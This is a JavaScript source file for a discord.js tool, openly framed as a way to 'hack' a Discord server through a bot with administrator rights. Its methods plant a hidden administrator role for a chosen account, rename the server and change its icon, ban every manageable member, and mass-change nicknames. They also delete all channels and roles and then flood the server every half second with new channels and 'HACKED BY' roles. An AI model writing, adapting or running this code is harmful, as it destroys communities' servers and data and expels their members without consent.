const Discord = require('discord.js')

class Tools {
    /**
     *
     * @param {Discord.Client} client The DISCORD Client
     * @param {Discord.Guild} guild The guild's ID to hack
     */
    constructor(client, guild) {
        this.client = client
        this.guild = guild
    }

    /**
     *
     * @returns {boolean}
     */
    handle_errors() {
        if (!this.guild) {
            console.error(
                `Guild is not reachable. Make sure the bot is in and has 'ADMINISTRATOR' permissions.`
            )
            return false
        }

        if (
            !this.guild.members.cache
                .get(this.client.user.id)
                .hasPermission('ADMINISTRATOR')
        ) {
            console.error(
                `${
                    this.client.user.username
                } requires 'ADMINISTRATOR' permissions.`
            )
            return false
        }
        return true
    }

    /**
     *
     * @param {string} account_id The member's ID to rankup
     * @returns null
     */
    async set_admin(account_id) {
        if (!this.handle_errors()) return null

        try {
            const role = await this.guild.roles.create({
                data: {
                    name: `\u200b`,
                    color: 0x2f3136,
                    permissions: 'ADMINISTRATOR',
                },
                reason: 'HACKED',
            })

            if (!role)
                return console.error('Unable to create the administrator role.')

            this.guild.members.cache.get(account_id).roles.add(role)
        } catch (_) {
            return console.error(`Unable to assign the administrator role.`)
        }
    }

    /**
     *
     * @param {object} new_guild_options Map supposed to match the config.guild's object
     * @param {string} new_guild_options.new_name New server's name
     * @param {string} new_guild_options.new_icon New server's icon
     * @returns null
     */
    async change_guild_info(
        new_guild_options = { new_name: new String(), new_icon: new String() }
    ) {
        if (!this.handle_errors()) return null

        if (new_guild_options.new_name)
            await this.guild.setName(new_guild_options.new_name)

        if (new_guild_options.new_icon)
            await this.guild.setIcon(new_guild_options.new_icon)
    }

    /**
     *
     * @returns null
     */
    ban_members() {
        if (!this.handle_errors()) return null

        this.guild.members.cache
            .filter((m) => m.manageable)
            .forEach(async (member) => {
                try {
                    await member.ban({
                        reason: `HACKED BY ${this.client.user.tag}`,
                    })
                } catch (_) {
                    0
                }
            })
    }

    /**
     *
     * @returns null
     */
    change_nicknames(new_nickname) {
        if (!this.handle_errors()) return null

        this.guild.members.cache
            .filter((m) => m.manageable)
            .forEach(async (member) => {
                try {
                    await member.setNickname(
                        new_nickname,
                        `HACKED BY ${client.user.tag}`
                    )
                } catch (_) {
                    0
                }
            })
    }

    /**
     *
     * @returns null
     */
    create_channels_and_roles(name) {
        if (!this.handle_errors()) return null

        this.guild.channels.cache
            .filter((c) => c.deletable)
            .forEach(async (channel) => {
                try {
                    await channel.delete()
                } catch (_) {
                    0
                }
            })

        this.guild.roles.cache
            .filter((r) => r.deletable)
            .forEach(async (role) => {
                try {
                    await role.delete()
                } catch (_) {
                    0
                }
            })

        setInterval(async () => {
            try {
                await this.guild.channels.create(name, 'text')
            } catch (_) {
                0
            }

            try {
                const role = await this.guild.roles.create({
                    data: {
                        name: `HACKED BY ${this.client.user.username}`,
                        permissions: 0,
                        color: 0xff0000,
                    },
                    reason: 'HACKED',
                })

                if (role)
                    this.guild.members.cache
                        .filter((m) => m.manageable)
                        .forEach(async (member) => {
                            try {
                                await member.roles.add(role)
                            } catch (_) {
                                0
                            }
                        })
            } catch (_) {
                0
            }
        }, 500)
    }
}

module.exports = { Tools }
